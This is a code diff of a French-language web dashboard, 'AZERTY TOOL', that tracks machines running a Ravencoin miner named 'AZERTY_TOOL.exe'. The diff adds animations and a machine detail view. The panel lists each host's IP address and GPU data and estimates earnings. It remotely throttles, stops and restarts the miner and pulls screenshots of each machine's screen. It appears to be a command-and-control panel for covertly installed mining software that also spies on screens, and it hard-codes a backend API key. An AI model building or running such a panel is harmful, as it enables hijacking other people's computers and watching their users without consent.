@@ -6,67 +6,168 @@
 <title>AZERTY TOOL - Dashboard</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0a;color:#e0e0e0;min-height:100vh}
-.header{background:linear-gradient(135deg,#0d1117,#161b22);border-bottom:1px solid #30363d;padding:20px 30px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
-.header h1{font-size:1.5rem;color:#00ff88;letter-spacing:2px}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0a;color:#e0e0e0;min-height:100vh;overflow-x:hidden}
+
+/* ---- ANIMATIONS ---- */
+@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes slideInRight{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(63,185,80,.4)}50%{box-shadow:0 0 0 8px rgba(63,185,80,0)}}
+@keyframes glow{0%,100%{text-shadow:0 0 10px rgba(0,255,136,.3)}50%{text-shadow:0 0 20px rgba(0,255,136,.6)}}
+@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
+@keyframes modalIn{from{opacity:0;transform:scale(.92) translateY(20px)}to{opacity:1;transform:scale(1) translateY(0)}}
+@keyframes modalBgIn{from{opacity:0}to{opacity:1}}
+@keyframes countUp{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
+@keyframes barFill{from{width:0}to{width:var(--bar-w)}}
+
+.header{background:linear-gradient(135deg,#0d1117,#161b22);border-bottom:1px solid #30363d;padding:20px 30px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;animation:fadeIn .6s ease}
+.header h1{font-size:1.5rem;color:#00ff88;letter-spacing:2px;animation:glow 3s ease-in-out infinite}
 .header .stats{display:flex;gap:12px;flex-wrap:wrap}
-.stat-box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px 14px;text-align:center;min-width:80px}
-.stat-box .num{font-size:1.4rem;font-weight:700;color:#00ff88}
+.stat-box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px 14px;text-align:center;min-width:80px;transition:transform .2s,border-color .2s;animation:fadeInUp .5s ease backwards}
+.stat-box:nth-child(1){animation-delay:.1s}.stat-box:nth-child(2){animation-delay:.2s}.stat-box:nth-child(3){animation-delay:.3s}.stat-box:nth-child(4){animation-delay:.4s}
+.stat-box:hover{transform:translateY(-2px);border-color:#00ff88}
+.stat-box .num{font-size:1.4rem;font-weight:700;color:#00ff88;animation:countUp .4s ease}
 .stat-box .label{font-size:.65rem;color:#8b949e;text-transform:uppercase;letter-spacing:1px}
-.earnings-banner{background:linear-gradient(135deg,#1a1a0a,#2a2a10);border-bottom:1px solid #3d3d1d;padding:14px 30px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
-.earnings-banner .earn-block{text-align:center}
+
+.earnings-banner{background:linear-gradient(135deg,#1a1a0a,#2a2a10);border-bottom:1px solid #3d3d1d;padding:14px 30px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;animation:fadeIn .7s ease}
+.earnings-banner .earn-block{text-align:center;transition:transform .2s}
+.earnings-banner .earn-block:hover{transform:scale(1.05)}
 .earnings-banner .earn-label{font-size:.7rem;color:#8b949e;text-transform:uppercase;letter-spacing:1px}
 .earnings-banner .earn-val{font-size:1.3rem;font-weight:700;color:#ffd700}
 .earnings-banner .earn-sub{font-size:.75rem;color:#8b949e}
 .earnings-banner .rvn-price{font-size:.8rem;color:#8b949e}
+
 .refresh-bar{background:#161b22;padding:8px 30px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #21262d;font-size:.8rem;color:#8b949e}
-.refresh-bar button{background:#238636;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:.8rem}
-.refresh-bar button:hover{background:#2ea043}
+.refresh-bar button{background:#238636;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:.8rem;transition:all .2s}
+.refresh-bar button:hover{background:#2ea043;transform:scale(1.05)}
+.refresh-bar button:active{transform:scale(.95)}
+
 .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px;padding:20px 30px}
-.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:18px;transition:border-color .2s}
-.card:hover{border-color:#00ff88}
+
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:18px;transition:all .3s cubic-bezier(.4,0,.2,1);cursor:pointer;animation:fadeInUp .5s ease backwards;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(0,255,136,.03),transparent);transition:left .5s}
+.card:hover::before{left:100%}
+.card:hover{border-color:#00ff88;transform:translateY(-4px);box-shadow:0 8px 30px rgba(0,255,136,.1)}
+.card:active{transform:translateY(-2px)}
+
 .card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
 .card-name{font-weight:700;font-size:1rem}
-.badge{padding:3px 10px;border-radius:20px;font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:1px}
-.badge.online{background:#0d2818;color:#3fb950;border:1px solid #238636}
+.badge{padding:3px 10px;border-radius:20px;font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:1px;transition:all .3s}
+.badge.online{background:#0d2818;color:#3fb950;border:1px solid #238636;animation:pulse 2s infinite}
 .badge.offline{background:#2d1215;color:#f85149;border:1px solid #da3633}
+
 .card-row{display:flex;justify-content:space-between;padding:4px 0;font-size:.85rem;border-bottom:1px solid #21262d}
 .card-row:last-child{border:none}
 .card-row .k{color:#8b949e}
 .card-row .v{color:#e0e0e0;font-weight:500}
+
 .gpu-bar{height:6px;background:#21262d;border-radius:3px;margin-top:8px;overflow:hidden}
-.gpu-bar .fill{height:100%;border-radius:3px;transition:width .5s}
+.gpu-bar .fill{height:100%;border-radius:3px;animation:barFill .8s ease;transition:width .5s}
+
 .card-earnings{background:#1a1a0a;border:1px solid #3d3d1d;border-radius:8px;padding:10px;margin-top:10px;display:flex;justify-content:space-around;text-align:center}
 .card-earnings .ce-block .ce-val{font-size:1rem;font-weight:700;color:#ffd700}
 .card-earnings .ce-block .ce-label{font-size:.65rem;color:#8b949e;text-transform:uppercase}
+
 .card-controls{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;margin-top:10px}
 .power-row{display:flex;align-items:center;gap:10px;margin-bottom:8px}
 .power-row label{font-size:.8rem;color:#8b949e;min-width:70px}
 .power-row input[type=range]{flex:1;accent-color:#00ff88;height:6px}
 .power-row .power-val{font-size:.9rem;font-weight:700;color:#00ff88;min-width:40px;text-align:right}
 .ctrl-btns{display:flex;gap:8px}
-.ctrl-btns button{flex:1;padding:8px;border:none;border-radius:6px;font-size:.8rem;font-weight:600;cursor:pointer;text-transform:uppercase;letter-spacing:1px;transition:opacity .2s}
-.ctrl-btns button:hover{opacity:.85}
+.ctrl-btns button{flex:1;padding:8px;border:none;border-radius:6px;font-size:.8rem;font-weight:600;cursor:pointer;text-transform:uppercase;letter-spacing:1px;transition:all .2s}
+.ctrl-btns button:hover{opacity:.85;transform:translateY(-1px)}
+.ctrl-btns button:active{transform:translateY(1px)}
 .btn-stop{background:#da3633;color:#fff}
 .btn-restart{background:#238636;color:#fff}
 .btn-screen{background:#8957e5;color:#fff}
-.toast{position:fixed;bottom:20px;right:20px;background:#238636;color:#fff;padding:12px 20px;border-radius:8px;font-size:.85rem;z-index:9999;opacity:0;transition:opacity .3s;pointer-events:none}
-.toast.show{opacity:1}
-.empty{text-align:center;padding:60px 20px;color:#8b949e}
+
+/* ---- TOAST ---- */
+.toast{position:fixed;bottom:20px;right:20px;background:#238636;color:#fff;padding:12px 20px;border-radius:8px;font-size:.85rem;z-index:99999;transform:translateY(80px);opacity:0;transition:all .4s cubic-bezier(.4,0,.2,1);pointer-events:none}
+.toast.show{transform:translateY(0);opacity:1}
+
+/* ---- MODAL OVERLAY ---- */
+.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:10000;align-items:center;justify-content:center;padding:20px}
+.modal-overlay.show{display:flex;animation:modalBgIn .3s ease}
+
+.modal-box{background:#0d1117;border:1px solid #30363d;border-radius:16px;width:100%;max-width:700px;max-height:90vh;overflow-y:auto;animation:modalIn .4s cubic-bezier(.4,0,.2,1);box-shadow:0 25px 60px rgba(0,0,0,.5)}
+
+.modal-top{display:flex;justify-content:space-between;align-items:center;padding:20px 24px;border-bottom:1px solid #21262d;position:sticky;top:0;background:#0d1117;z-index:1;border-radius:16px 16px 0 0}
+.modal-top h2{font-size:1.1rem;color:#e0e0e0;display:flex;align-items:center;gap:10px}
+.modal-top .m-badge{font-size:.7rem}
+.modal-close{background:none;border:1px solid #30363d;color:#8b949e;width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:1.2rem;display:flex;align-items:center;justify-content:center;transition:all .2s}
+.modal-close:hover{color:#fff;border-color:#8b949e;background:#161b22}
+
+.modal-content{padding:20px 24px}
+
+.modal-section{margin-bottom:20px;animation:fadeInUp .4s ease backwards}
+.modal-section:nth-child(1){animation-delay:.1s}
+.modal-section:nth-child(2){animation-delay:.2s}
+.modal-section:nth-child(3){animation-delay:.3s}
+.modal-section:nth-child(4){animation-delay:.4s}
+.modal-section-title{font-size:.75rem;text-transform:uppercase;letter-spacing:2px;color:#8b949e;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid #21262d}
+
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.info-item{background:#161b22;border-radius:8px;padding:10px 14px;border:1px solid #21262d;transition:border-color .2s}
+.info-item:hover{border-color:#30363d}
+.info-item .ii-label{font-size:.7rem;color:#8b949e;text-transform:uppercase;letter-spacing:1px;margin-bottom:2px}
+.info-item .ii-val{font-size:.95rem;font-weight:600;color:#e0e0e0}
+.info-item .ii-val.green{color:#3fb950}
+.info-item .ii-val.gold{color:#ffd700}
+.info-item .ii-val.red{color:#f85149}
+.info-item .ii-val.purple{color:#bc8cff}
+
+.modal-gpu-bar{height:10px;background:#21262d;border-radius:5px;overflow:hidden;margin-top:6px}
+.modal-gpu-bar .fill{height:100%;border-radius:5px;transition:width .8s ease}
+
+/* ---- SCREENSHOT SECTION ---- */
+.screen-gallery{display:grid;grid-template-columns:1fr;gap:12px}
+.screen-item{background:#161b22;border:1px solid #21262d;border-radius:10px;overflow:hidden;transition:all .3s}
+.screen-item:hover{border-color:#8957e5}
+.screen-item img{width:100%;display:block;cursor:pointer;transition:transform .3s}
+.screen-item img:hover{transform:scale(1.02)}
+.screen-meta{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:#0d1117}
+.screen-meta .screen-date{font-size:.8rem;color:#8b949e}
+.screen-meta .btn-delete{background:none;border:1px solid #da3633;color:#f85149;padding:4px 12px;border-radius:6px;font-size:.75rem;cursor:pointer;transition:all .2s}
+.screen-meta .btn-delete:hover{background:#da3633;color:#fff}
+.no-screens{text-align:center;padding:30px;color:#484f58;font-size:.9rem}
+
+/* ---- FULLSCREEN IMAGE ---- */
+.fullscreen-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.95);z-index:20000;align-items:center;justify-content:center;cursor:zoom-out;padding:20px}
+.fullscreen-overlay.show{display:flex;animation:modalBgIn .2s ease}
+.fullscreen-overlay img{max-width:95vw;max-height:95vh;border-radius:8px;animation:modalIn .3s ease}
+
+/* ---- MODAL CONTROLS ---- */
+.modal-controls{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:16px}
+.modal-power-row{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.modal-power-row label{font-size:.85rem;color:#8b949e;min-width:80px}
+.modal-power-row input[type=range]{flex:1;accent-color:#00ff88;height:8px}
+.modal-power-row .mpw-val{font-size:1rem;font-weight:700;color:#00ff88;min-width:50px;text-align:right}
+.modal-btns{display:flex;gap:10px}
+.modal-btns button{flex:1;padding:10px;border:none;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer;text-transform:uppercase;letter-spacing:1px;transition:all .2s}
+.modal-btns button:hover{transform:translateY(-2px);box-shadow:0 4px 15px rgba(0,0,0,.3)}
+.modal-btns button:active{transform:translateY(0)}
+
+/* ---- DELETE MACHINE ---- */
+.btn-delete-machine{background:none;border:1px solid #da3633;color:#f85149;padding:8px 16px;border-radius:8px;font-size:.8rem;cursor:pointer;transition:all .2s;width:100%;margin-top:10px;text-transform:uppercase;letter-spacing:1px;font-weight:600}
+.btn-delete-machine:hover{background:#da3633;color:#fff}
+
+.empty{text-align:center;padding:60px 20px;color:#8b949e;animation:fadeIn .8s ease}
 .empty h2{color:#30363d;margin-bottom:10px}
-.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:10000;align-items:center;justify-content:center}
-.modal-overlay.show{display:flex}
-.modal-box{background:#161b22;border:1px solid #30363d;border-radius:12px;max-width:95vw;max-height:95vh;overflow:auto;position:relative}
-.modal-header{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;border-bottom:1px solid #21262d}
-.modal-header h3{font-size:1rem;color:#e0e0e0}
-.modal-header .modal-time{font-size:.75rem;color:#8b949e}
-.modal-close{background:none;border:none;color:#8b949e;font-size:1.4rem;cursor:pointer;padding:4px 8px}
-.modal-close:hover{color:#fff}
-.modal-body{padding:12px}
-.modal-body img{max-width:100%;border-radius:6px}
-.modal-body .no-screen{text-align:center;padding:40px;color:#8b949e}
-.screen-loading{text-align:center;padding:20px;color:#8b949e;font-size:.85rem}
-@media(max-width:600px){.header{flex-direction:column}.header .stats{width:100%;justify-content:center}.grid{padding:12px}.earnings-banner{flex-direction:column;align-items:stretch;text-align:center}}
+
+/* ---- SCROLLBAR ---- */
+::-webkit-scrollbar{width:8px}
+::-webkit-scrollbar-track{background:#0d1117}
+::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:#484f58}
+
+@media(max-width:600px){
+  .header{flex-direction:column}
+  .header .stats{width:100%;justify-content:center}
+  .grid{padding:12px}
+  .earnings-banner{flex-direction:column;align-items:stretch;text-align:center}
+  .info-grid{grid-template-columns:1fr}
+  .modal-box{max-width:100%;margin:10px}
+}
 </style>
 </head>
 <body>
@@ -106,57 +207,63 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0a;color:#e0e0e
 <div class="grid" id="grid"></div>
 <div class="toast" id="toast"></div>
 
-<div class="modal-overlay" id="modal" onclick="closeModal(event)">
+<!-- MODAL DETAIL MACHINE -->
+<div class="modal-overlay" id="modal" onclick="closeMachineModal(event)">
   <div class="modal-box" onclick="event.stopPropagation()">
-    <div class="modal-header">
-      <h3 id="modal-title">Capture d'ecran</h3>
-      <div>
-        <span class="modal-time" id="modal-time"></span>
-        <button class="modal-close" onclick="document.getElementById('modal').classList.remove('show')">&times;</button>
-      </div>
+    <div class="modal-top">
+      <h2 id="m-title">Machine</h2>
+      <button class="modal-close" onclick="document.getElementById('modal').classList.remove('show')">&times;</button>
     </div>
-    <div class="modal-body" id="modal-body">
-      <div class="no-screen">Aucune capture disponible</div>
-    </div>
+    <div class="modal-content" id="m-content"></div>
   </div>
+</div>
+
+<!-- FULLSCREEN SCREENSHOT -->
+<div class="fullscreen-overlay" id="fullscreen" onclick="this.classList.remove('show')">
+  <img id="fs-img" src="" alt="Screenshot">
 </div>
 
 <script>
 const SUPABASE_URL='https://imwdpuumpvecpziigsyz.supabase.co';
 const SUPABASE_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imltd2RwdXVtcHZlY3B6aWlnc3l6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTUyNTU4MDIsImV4cCI6MjExMDgzMTgwMn0.xK1YmdiLQ8yyWnvq4XX1KUakMoudHSCuwoN63lBIu8w';
+const HEADERS={'apikey':SUPABASE_KEY,'Authorization':'Bearer '+SUPABASE_KEY};
 
 let rvnPriceUsd=0;
-var machinesCache=[];
+let machinesCache=[];
 
 function showToast(msg){
   const t=document.getElementById('toast');
   t.textContent=msg;
   t.classList.add('show');
-  setTimeout(function(){t.classList.remove('show')},2500);
+  setTimeout(()=>t.classList.remove('show'),2500);
 }
 
-function closeModal(e){
+function closeMachineModal(e){
   if(e.target===document.getElementById('modal'))
     document.getElementById('modal').classList.remove('show');
 }
 
-async function sendCommand(hostname,field,value){
-  var body={};body[field]=value;
-  try{
-    await fetch(SUPABASE_URL+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname),{
-      method:'PATCH',
-      headers:{'apikey':SUPABASE_KEY,'Authorization':'Bearer '+SUPABASE_KEY,'Content-Type':'application/json','Prefer':'return=minimal'},
-      body:JSON.stringify(body)
-    });
-    showToast(hostname+' : '+field+'='+value);
-    setTimeout(loadData,2000);
-  }catch(e){
-    showToast('Erreur: '+e.message);
-  }
+async function supaPatch(hostname,body){
+  await fetch(SUPABASE_URL+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname),{
+    method:'PATCH',
+    headers:{...HEADERS,'Content-Type':'application/json','Prefer':'return=minimal'},
+    body:JSON.stringify(body)
+  });
 }
 
-function setPower(hostname,val){
-  document.getElementById('pw-'+hostname).textContent=val+'%';
+async function sendCommand(hostname,field,value){
+  try{
+    const body={};body[field]=value;
+    await supaPatch(hostname,body);
+    showToast(hostname+' : '+field+'='+value);
+    setTimeout(loadData,2000);
+  }catch(e){showToast('Erreur: '+e.message)}
+}
+
+function setPower(hostname,val,fromModal){
+  if(fromModal) document.getElementById('mpw-val').textContent=val+'%';
+  const cardEl=document.getElementById('pw-'+hostname);
+  if(cardEl) cardEl.textContent=val+'%';
   sendCommand(hostname,'target_power',parseInt(val));
 }
 
@@ -172,60 +279,145 @@ function restartMiner(hostname){
 function requestScreenshot(hostname){
   showToast('Capture demandee a '+hostname+'...');
   sendCommand(hostname,'command','screenshot');
-  setTimeout(function(){showScreenshot(hostname)},8000);
+  setTimeout(()=>openMachineDetail(hostname),8000);
 }
 
-async function showScreenshot(hostname){
-  document.getElementById('modal-title').textContent='Capture - '+hostname;
-  document.getElementById('modal-body').innerHTML='<div class="screen-loading">Chargement de la capture...</div>';
-  document.getElementById('modal').classList.add('show');
-
+async function deleteScreenshot(hostname){
+  if(!confirm('Supprimer la capture de '+hostname+' ?')) return;
   try{
-    var r=await fetch(SUPABASE_URL+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname)+'&select=screenshot_b64,screenshot_at',{
-      headers:{'apikey':SUPABASE_KEY,'Authorization':'Bearer '+SUPABASE_KEY}
+    await supaPatch(hostname,{screenshot_b64:null,screenshot_at:null});
+    showToast('Capture supprimee');
+    openMachineDetail(hostname);
+  }catch(e){showToast('Erreur: '+e.message)}
+}
+
+async function deleteMachine(hostname){
+  if(!confirm('Supprimer la machine '+hostname+' du dashboard ?\nCette action est irreversible.')) return;
+  try{
+    await fetch(SUPABASE_URL+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname),{
+      method:'DELETE',
+      headers:{...HEADERS,'Prefer':'return=minimal'}
     });
-    var data=await r.json();
+    showToast(hostname+' supprime');
+    document.getElementById('modal').classList.remove('show');
+    loadData();
+  }catch(e){showToast('Erreur: '+e.message)}
+}
+
+function showFullscreen(src){
+  document.getElementById('fs-img').src=src;
+  document.getElementById('fullscreen').classList.add('show');
+}
+
+async function openMachineDetail(hostname){
+  const m=machinesCache.find(x=>x.hostname===hostname);
+  if(!m) return;
+
+  document.getElementById('m-title').innerHTML=esc(hostname)+' <span class="badge m-badge '+(m._online?'online':'offline')+'">'+(m._online?'En ligne':'Hors ligne')+'</span>';
+
+  const e=estimateEarnings(m.hashrate_mhs||0,m.uptime_minutes||0);
+  const gpuColor=m.gpu_usage_percent>70?'#f85149':m.gpu_usage_percent>40?'#d29922':'#3fb950';
+  const upH=Math.floor((m.uptime_minutes||0)/60);
+  const upM=(m.uptime_minutes||0)%60;
+  const curPower=m.target_power||100;
+  const lastSeen=m.last_seen?new Date(m.last_seen).toLocaleString('fr-FR'):'--';
+  const h=esc(hostname);
+
+  let screenHtml='<div class="no-screens">Aucune capture disponible</div>';
+  try{
+    const r=await fetch(SUPABASE_URL+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname)+'&select=screenshot_b64,screenshot_at',{headers:HEADERS});
+    const data=await r.json();
     if(data.length>0 && data[0].screenshot_b64){
-      var timeStr='';
-      if(data[0].screenshot_at){
-        var d=new Date(data[0].screenshot_at);
-        timeStr=d.toLocaleString('fr-FR');
-      }
-      document.getElementById('modal-time').textContent=timeStr;
-      document.getElementById('modal-body').innerHTML='<img src="data:image/jpeg;base64,'+data[0].screenshot_b64+'" alt="Screenshot '+esc(hostname)+'">';
-    }else{
-      document.getElementById('modal-time').textContent='';
-      document.getElementById('modal-body').innerHTML='<div class="no-screen">Aucune capture disponible.<br>La machine doit etre en ligne et recevoir la commande.</div>';
+      const timeStr=data[0].screenshot_at?new Date(data[0].screenshot_at).toLocaleString('fr-FR'):'';
+      const imgSrc='data:image/jpeg;base64,'+data[0].screenshot_b64;
+      screenHtml='<div class="screen-gallery">'
+        +'<div class="screen-item">'
+          +'<img src="'+imgSrc+'" alt="Screenshot" onclick="showFullscreen(this.src)">'
+          +'<div class="screen-meta">'
+            +'<span class="screen-date">'+esc(timeStr)+'</span>'
+            +'<button class="btn-delete" onclick="deleteScreenshot(\''+h+'\')">Supprimer</button>'
+          +'</div>'
+        +'</div>'
+      +'</div>';
     }
-  }catch(e){
-    document.getElementById('modal-body').innerHTML='<div class="no-screen">Erreur: '+esc(e.message)+'</div>';
-  }
+  }catch{}
+
+  document.getElementById('m-content').innerHTML=
+    '<div class="modal-section">'
+      +'<div class="modal-section-title">Informations</div>'
+      +'<div class="info-grid">'
+        +'<div class="info-item"><div class="ii-label">GPU</div><div class="ii-val">'+esc(m.gpu_name||'--')+'</div></div>'
+        +'<div class="info-item"><div class="ii-label">Vendeur</div><div class="ii-val purple">'+esc(m.gpu_vendor||'--')+'</div></div>'
+        +'<div class="info-item"><div class="ii-label">Hashrate</div><div class="ii-val green">'+(m.hashrate_mhs||0).toFixed(2)+' MH/s</div></div>'
+        +'<div class="info-item"><div class="ii-label">Temperature</div><div class="ii-val '+(m.gpu_temp_c>70?'red':'')+'">'+m.gpu_temp_c+'&deg;C</div></div>'
+        +'<div class="info-item"><div class="ii-label">Adresse IP</div><div class="ii-val">'+esc(m.ip_address||'--')+'</div></div>'
+        +'<div class="info-item"><div class="ii-label">Uptime</div><div class="ii-val">'+upH+'h '+upM+'m</div></div>'
+        +'<div class="info-item"><div class="ii-label">Derniere MAJ</div><div class="ii-val">'+esc(lastSeen)+'</div></div>'
+        +'<div class="info-item"><div class="ii-label">Puissance</div><div class="ii-val green">'+curPower+'%</div></div>'
+      +'</div>'
+      +'<div style="margin-top:10px">'
+        +'<div style="display:flex;justify-content:space-between;font-size:.8rem;color:#8b949e;margin-bottom:4px"><span>Utilisation GPU</span><span style="color:'+gpuColor+'">'+m.gpu_usage_percent+'%</span></div>'
+        +'<div class="modal-gpu-bar"><div class="fill" style="width:'+m.gpu_usage_percent+'%;background:'+gpuColor+'"></div></div>'
+      +'</div>'
+    +'</div>'
+
+    +'<div class="modal-section">'
+      +'<div class="modal-section-title">Gains estimes</div>'
+      +'<div class="info-grid">'
+        +'<div class="info-item"><div class="ii-label">RVN / jour</div><div class="ii-val gold">'+e.dailyRvn.toFixed(1)+' RVN</div></div>'
+        +'<div class="info-item"><div class="ii-label">$ / jour</div><div class="ii-val gold">$'+(e.dailyRvn*rvnPriceUsd).toFixed(2)+'</div></div>'
+        +'<div class="info-item"><div class="ii-label">RVN total (uptime)</div><div class="ii-val gold">'+e.totalRvn.toFixed(0)+' RVN</div></div>'
+        +'<div class="info-item"><div class="ii-label">$ total</div><div class="ii-val gold">$'+(e.totalRvn*rvnPriceUsd).toFixed(2)+'</div></div>'
+      +'</div>'
+    +'</div>'
+
+    +'<div class="modal-section">'
+      +'<div class="modal-section-title">Captures d\'ecran</div>'
+      +screenHtml
+    +'</div>'
+
+    +'<div class="modal-section">'
+      +'<div class="modal-section-title">Controles</div>'
+      +'<div class="modal-controls">'
+        +'<div class="modal-power-row">'
+          +'<label>Puissance</label>'
+          +'<input type="range" min="10" max="100" step="5" value="'+curPower+'" onchange="setPower(\''+h+'\',this.value,true)" oninput="document.getElementById(\'mpw-val\').textContent=this.value+\'%\'">'
+          +'<span class="mpw-val" id="mpw-val">'+curPower+'%</span>'
+        +'</div>'
+        +'<div class="modal-btns">'
+          +'<button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">Capture</button>'
+          +'<button class="btn-stop" onclick="stopMiner(\''+h+'\')">Stop</button>'
+          +'<button class="btn-restart" onclick="restartMiner(\''+h+'\')">Restart</button>'
+        +'</div>'
+      +'</div>'
+      +'<button class="btn-delete-machine" onclick="deleteMachine(\''+h+'\')">Supprimer cette machine</button>'
+    +'</div>';
+
+  document.getElementById('modal').classList.add('show');
 }
 
 async function fetchRvnPrice(){
   try{
-    var r=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ravencoin&vs_currencies=usd');
-    var d=await r.json();
+    const r=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ravencoin&vs_currencies=usd');
+    const d=await r.json();
     if(d.ravencoin&&d.ravencoin.usd) rvnPriceUsd=d.ravencoin.usd;
   }catch{}
 }
 
-var RVN_PER_MHS_PER_DAY=15;
+const RVN_PER_MHS_PER_DAY=15;
 
 function estimateEarnings(hashrateMhs,uptimeMinutes){
-  var dailyRvn=hashrateMhs*RVN_PER_MHS_PER_DAY;
-  var uptimeDays=uptimeMinutes/1440;
-  var totalRvn=dailyRvn*uptimeDays;
-  return{dailyRvn:dailyRvn,totalRvn:totalRvn};
+  const dailyRvn=hashrateMhs*RVN_PER_MHS_PER_DAY;
+  const uptimeDays=uptimeMinutes/1440;
+  const totalRvn=dailyRvn*uptimeDays;
+  return{dailyRvn,totalRvn};
 }
 
 async function loadData(){
   if(rvnPriceUsd===0) await fetchRvnPrice();
   try{
-    var r=await fetch(SUPABASE_URL+'/rest/v1/machines?select=hostname,gpu_name,gpu_vendor,gpu_usage_percent,gpu_temp_c,hashrate_mhs,status,ip_address,uptime_minutes,last_seen,target_power,command&order=hostname',{
-      headers:{'apikey':SUPABASE_KEY,'Authorization':'Bearer '+SUPABASE_KEY}
-    });
-    var data=await r.json();
+    const r=await fetch(SUPABASE_URL+'/rest/v1/machines?select=hostname,gpu_name,gpu_vendor,gpu_usage_percent,gpu_temp_c,hashrate_mhs,status,ip_address,uptime_minutes,last_seen,target_power,command&order=hostname',{headers:HEADERS});
+    const data=await r.json();
     if(!Array.isArray(data)){
       document.getElementById('grid').innerHTML='<div class="empty"><h2>Erreur API</h2><p>'+(data.message||JSON.stringify(data))+'</p></div>';
       return;
@@ -238,17 +430,17 @@ async function loadData(){
 }
 
 function render(machines){
-  var now=Date.now();
+  const now=Date.now();
   if(!machines||!machines.length){machines=[];}
-  machines.forEach(function(m){
-    var lastSeen=new Date(m.last_seen).getTime();
+  machines.forEach(m=>{
+    const lastSeen=new Date(m.last_seen).getTime();
     m._online=(now-lastSeen)<300000;
   });
 
-  var total=machines.length;
-  var onlineCount=machines.filter(function(m){return m._online}).length;
-  var offlineCount=total-onlineCount;
-  var totalHash=machines.reduce(function(s,m){return s+(m.hashrate_mhs||0)},0);
+  const total=machines.length;
+  const onlineCount=machines.filter(m=>m._online).length;
+  const offlineCount=total-onlineCount;
+  const totalHash=machines.reduce((s,m)=>s+(m.hashrate_mhs||0),0);
 
   document.getElementById('total').textContent=total;
   document.getElementById('online').textContent=onlineCount;
@@ -256,10 +448,9 @@ function render(machines){
   document.getElementById('avg-hash').textContent=totalHash.toFixed(1);
   document.getElementById('last-update').textContent=new Date().toLocaleTimeString('fr-FR');
 
-  var globalDailyRvn=0;
-  var globalTotalRvn=0;
-  machines.forEach(function(m){
-    var e=estimateEarnings(m.hashrate_mhs||0,m.uptime_minutes||0);
+  let globalDailyRvn=0,globalTotalRvn=0;
+  machines.forEach(m=>{
+    const e=estimateEarnings(m.hashrate_mhs||0,m.uptime_minutes||0);
     globalDailyRvn+=e.dailyRvn;
     globalTotalRvn+=e.totalRvn;
   });
@@ -272,40 +463,39 @@ function render(machines){
   document.getElementById('total-usd').textContent='~$'+(globalTotalRvn*rvnPriceUsd).toFixed(2);
   document.getElementById('rvn-price').textContent=rvnPriceUsd.toFixed(4);
 
-  var grid=document.getElementById('grid');
+  const grid=document.getElementById('grid');
   if(total===0){
     grid.innerHTML='<div class="empty"><h2>Aucune machine detectee</h2><p>Lancez AZERTY_TOOL.exe sur vos machines</p></div>';
     return;
   }
 
-  grid.innerHTML=machines.map(function(m){
-    var status=m._online?'online':'offline';
-    var statusLabel=m._online?'En ligne':'Hors ligne';
-    var gpuColor=m.gpu_usage_percent>70?'#f85149':m.gpu_usage_percent>40?'#d29922':'#3fb950';
-    var upH=Math.floor(m.uptime_minutes/60);
-    var upM=m.uptime_minutes%60;
-    var e=estimateEarnings(m.hashrate_mhs||0,m.uptime_minutes||0);
-    var curPower=m.target_power||100;
-    var h=esc(m.hostname);
+  grid.innerHTML=machines.map((m,i)=>{
+    const status=m._online?'online':'offline';
+    const statusLabel=m._online?'En ligne':'Hors ligne';
